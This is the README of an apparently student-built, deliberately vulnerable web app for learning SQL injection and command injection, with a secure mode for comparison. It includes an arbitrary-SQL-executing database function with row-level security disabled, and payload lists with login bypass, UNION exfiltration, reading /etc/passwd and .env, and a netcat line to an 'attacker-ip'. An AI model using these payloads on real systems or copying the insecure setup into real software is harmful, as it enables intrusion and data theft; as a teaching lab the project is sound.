# 🔓 PentesCuy - Penetration Testing Lab

![Security](https://img.shields.io/badge/Security-Educational-red)
![React](https://img.shields.io/badge/React-19.x-blue)
![Node](https://img.shields.io/badge/Node.js-Express-green)
![Database](https://img.shields.io/badge/Database-Supabase-purple)

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja dibuat vulnerable untuk tujuan edukasi penetration testing. **JANGAN PERNAH** deploy ke production atau expose ke internet!

## 📖 Deskripsi

**PentesCuy** adalah web application yang dirancang khusus untuk pembelajaran penetration testing dengan fokus pada dua vulnerability kritis:

- **SQL Injection** - Authentication bypass dan data exfiltration
- **Command Injection** - Remote code execution pada sistem

Project ini dibuat sebagai bagian dari proyek akhir mata kuliah Keamanan Jaringan untuk mensimulasikan siklus lengkap penetration testing dari target creation hingga remediation.

## ✨ Features

### 🔴 Vulnerable Mode
- **Login System** dengan SQL Injection vulnerability
- **User Search** yang vulnerable terhadap SQL injection
- **Ping Tool** dengan command injection vulnerability  
- **System Info** tool yang bisa dieksploitasi untuk RCE

### 🟢 Secure Mode
- Implementation of security best practices
- Parameterized queries untuk SQL injection protection
- Input validation dan sanitization
- Whitelist approach untuk command execution
- Side-by-side comparison untuk learning

## 🏗️ Tech Stack

### Frontend
- **React 19** - UI library
- **Vite 7** - Build tool dan dev server
- **Tailwind CSS** - Styling framework
- **Lucide React** - Icon library
- **Axios** - HTTP client

### Backend
- **Node.js** - Runtime environment
- **Express.js** - Web framework
- **CORS** - Cross-origin resource sharing
- **dotenv** - Environment variables management

### Database
- **Supabase** - PostgreSQL database as a service
- **@supabase/supabase-js** - JavaScript client

## 📋 Prerequisites

Sebelum menjalankan project, pastikan Anda sudah install:

- **Node.js** v18 atau lebih baru ([Download](https://nodejs.org/))
- **npm** v9 atau lebih baru (included dengan Node.js)
- **Git** (optional, untuk clone repository)
- **Akun Supabase** gratis ([Sign up](https://supabase.com))

## 🚀 Installation & Setup

### Step 1: Clone atau Download Project

```bash
# Jika menggunakan Git
git clone <repository-url>
cd vulnerable-webapp

# Atau download ZIP dan extract
```

### Step 2: Install Dependencies

```bash
npm install
```

### Step 3: Setup Supabase

1. Buka [supabase.com](https://supabase.com) dan buat project baru
2. Ikuti panduan lengkap di **[SUPABASE_SETUP.md](./SUPABASE_SETUP.md)**
3. Copy project URL dan API key

### Step 4: Configure Environment Variables

1. Rename `.env.example` menjadi `.env`
2. Update dengan credentials Supabase Anda:

```env
VITE_SUPABASE_URL=https://your-project-id.supabase.co
VITE_SUPABASE_ANON_KEY=your-anon-key-here
PORT=3001
```

### Step 5: Setup Database

Jalankan SQL queries di Supabase SQL Editor (lihat [SUPABASE_SETUP.md](./SUPABASE_SETUP.md)):

```sql
-- Create users table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT NOW()
);

-- Insert sample data
INSERT INTO users (username, email, password, role) VALUES
('admin', 'admin@pentescuy.com', 'admin123', 'administrator'),
('john_doe', 'john@example.com', 'password123', 'user'),
('jane_smith', 'jane@example.com', 'qwerty456', 'user'),
('bob_wilson', 'bob@example.com', 'test789', 'user'),
('alice_brown', 'alice@example.com', 'pass2024', 'moderator');

-- Create vulnerable function
CREATE OR REPLACE FUNCTION execute_sql(query_text TEXT)
RETURNS JSON
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
    result JSON;
BEGIN
    EXECUTE 'SELECT json_agg(row_to_json(t)) FROM (' || query_text || ') t' INTO result;
    RETURN COALESCE(result, '[]'::json);
EXCEPTION
    WHEN OTHERS THEN
        RETURN json_build_object('error', SQLERRM);
END;
$$;

-- Disable RLS (INSECURE - for educational purposes only)
ALTER TABLE users DISABLE ROW LEVEL SECURITY;
GRANT ALL ON users TO anon;
```

### Step 6: Run the Application

Buka **2 terminal** terpisah:

**Terminal 1 - Backend Server:**
```bash
npm run server
```
Output: `🚀 Server running on http://localhost:3001`

**Terminal 2 - Frontend Dev Server:**
```bash
npm run dev
```
Output: `➜ Local: http://localhost:5173/`

### Step 7: Access the Application

Buka browser dan navigasi ke: **http://localhost:5173**

## 🎮 How to Use

### 1. Toggle Security Mode

Di header aplikasi, klik tombol untuk switch antara:
- 🔓 **Vulnerable Mode** - Endpoints dengan vulnerability
- 🔒 **Secure Mode** - Endpoints dengan proteksi

### 2. Test SQL Injection

#### Login Page
- Klik "Login Test" di navigation
- Try payload: `' OR '1'='1` di username field
- Observe authentication bypass

#### User Search
- Klik "User Search" di navigation  
- Try payload: `' UNION SELECT id, username, email, password FROM users--`
- Observe password exposure

### 3. Test Command Injection

#### Ping Tool
- Klik "System Tools" di navigation
- Try payload: `google.com & whoami`
- Observe command execution

#### System Info
- Try payload: `" & dir & echo "`
- Observe directory listing

### 4. Compare with Secure Mode

Toggle ke **Secure Mode** dan test ulang payload yang sama untuk melihat perbedaan proteksi.

## 📁 Project Structure

```
vulnerable-webapp/
├── src/
│   ├── components/
│   │   ├── Login.jsx          # Login form dengan SQL injection
│   │   ├── UserSearch.jsx     # Search interface dengan SQL injection
│   │   └── SystemTools.jsx    # Ping & system info dengan command injection
│   ├── lib/
│   │   ├── api.js             # API client dengan axios
│   │   └── supabaseClient.js  # Supabase configuration
│   ├── App.jsx                # Main application component
│   ├── main.jsx               # React entry point
│   └── index.css              # Tailwind CSS imports
├── server.js                  # Express backend server
├── .env                       # Environment variables (tidak di-commit)
├── .env.example               # Template untuk .env
├── package.json               # Dependencies dan scripts
├── tailwind.config.js         # Tailwind configuration
├── vite.config.js             # Vite configuration
├── SUPABASE_SETUP.md          # Panduan setup Supabase
├── PENETRATION_TESTING_GUIDE.md  # Panduan lengkap pentest
└── README.md                  # This file
```

## 🔐 Security Features Comparison

| Feature | Vulnerable Mode | Secure Mode |
|---------|-----------------|-------------|
| **SQL Queries** | String concatenation | Parameterized queries |
| **Input Validation** | None | Strict regex validation |
| **Command Execution** | Direct `exec()` | `execFile()` with validation |
| **User Input** | Directly in queries/commands | Sanitized & validated |
| **Error Messages** | Detailed (info leak) | Generic messages |
| **Authentication** | Bypassable | Secure |

## 🎯 Penetration Testing Workflow

Project ini mengikuti alur penetration testing standar:

### 1. **Target Creation** ✅
- Setup vulnerable web application
- Configure database dengan weak security
- Deploy tanpa proper input validation

### 2. **Enumeration** 🔍
- Port scanning (3001, 5173)
- Technology stack identification
- Endpoint discovery
- Database schema enumeration

### 3. **Exploitation** 💥
- SQL Injection attacks:
  - Authentication bypass
  - Data exfiltration
  - Database enumeration
- Command Injection attacks:
  - Remote code execution
  - System information disclosure
  - File system access

### 4. **Remediation** 🛡️
- Implement parameterized queries
- Add input validation & sanitization
- Use whitelist approach
- Apply security best practices

### 5. **Proof** ✅
- Test attacks pada secure mode
- Verify protections are working
- Document before/after comparison

**📚 Untuk panduan lengkap, lihat [PENETRATION_TESTING_GUIDE.md](./PENETRATION_TESTING_GUIDE.md)**

## 🧪 Testing Payloads

### SQL Injection Payloads

```sql
-- Authentication Bypass
' OR '1'='1
admin'--
' OR '1'='1'--

-- Data Exfiltration
' UNION SELECT id, username, email, password FROM users--
' UNION SELECT null, table_name, null, null FROM information_schema.tables--

-- Database Enumeration
' UNION SELECT null, column_name, data_type, null FROM information_schema.columns--
```

### Command Injection Payloads

```bash
# Windows
google.com & whoami
google.com && dir
google.com & ipconfig
" & type .env & echo "

# Linux (jika deploy di Linux)
google.com; ls -la
google.com && cat /etc/passwd
google.com | nc attacker-ip 4444
```

## 📊 API Endpoints

### Vulnerable Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/login` | Login dengan SQL injection vulnerability |
| GET | `/api/search?query=` | Search users dengan SQL injection |
| POST | `/api/ping` | Ping tool dengan command injection |
| POST | `/api/system-info` | System info dengan command injection |

### Secure Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/secure/login` | Login dengan parameterized queries |
| GET | `/api/secure/search?query=` | Secure search dengan query builder |
| POST | `/api/secure/ping` | Ping dengan input validation |
| POST | `/api/secure/system-info` | System info dengan whitelist |

## 🐛 Troubleshooting

### Backend tidak bisa connect ke Supabase
```bash
# Check .env file
cat .env

# Pastikan VITE_SUPABASE_URL dan VITE_SUPABASE_ANON_KEY sudah benar
# Restart server setelah update .env
```

### CORS Error
```javascript
// Pastikan backend server (port 3001) sudah running
// Check terminal backend untuk error messages
```

### SQL Injection tidak bekerja
```sql
-- Pastikan function execute_sql sudah dibuat di Supabase
-- Check di SQL Editor:
SELECT execute_sql('SELECT * FROM users');
```

### Command Injection tidak bekerja
```bash
# Windows command syntax berbeda dengan Linux
# Use & untuk Windows, ; untuk Linux
# Pastikan backend berjalan di OS yang sesuai
```

### Frontend tidak load styles
```bash
# Clear vite cache dan rebuild
rm -rf node_modules/.vite
npm run dev
```

## ⚠️ Security Disclaimer

**PERHATIAN PENTING:**

1. ⛔ **JANGAN** deploy aplikasi ini ke production
2. ⛔ **JANGAN** expose ke internet public
3. ⛔ **JANGAN** gunakan dengan data real/sensitive
4. ⛔ **JANGAN** test pada sistem yang bukan milik Anda
5. ✅ **HANYA** gunakan di environment local untuk belajar
6. ✅ **SELALU** test di virtual machine atau container jika memungkinkan

**This application contains intentional security vulnerabilities for educational purposes only.**

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)

## 🤝 Contributing

Karena ini adalah project edukasi, contributions welcome untuk:
- Menambah vulnerability types lain
- Improve documentation
- Add more test cases
- Translate ke bahasa lain

## 📄 License

Project ini dibuat untuk keperluan edukasi dan pembelajaran. Gunakan secara bertanggung jawab dan etis.

## 👨‍💻 Author

Dibuat sebagai proyek akhir mata kuliah Keamanan Jaringan - Semester 5

---

## 🎓 Untuk Dosen/Reviewer

**Project ini memenuhi requirements:**

✅ **Target Creation**: Web app vulnerable dibuat dari scratch (bukan DVWA)  
✅ **SQL Injection**: Implemented di login & search features  
✅ **Command Injection**: Implemented di system tools  
✅ **Enumeration**: Tools dan methodology provided  
✅ **Exploitation**: Detailed attack vectors documented  
✅ **Remediation**: Secure implementations provided  
✅ **Proof**: Comparison mode untuk verify fixes  
✅ **Documentation**: Lengkap dengan 2 markdown files  
✅ **Simple but functional**: 2+ pages dengan exploitable features  

**Teknologi modern:** React + Vite + Tailwind + Supabase untuk tampilan menarik.

---

**Happy Ethical Hacking! 🎯🔒**

*Remember: With great power comes great responsibility. Use this knowledge to build more secure systems, not to harm others.*
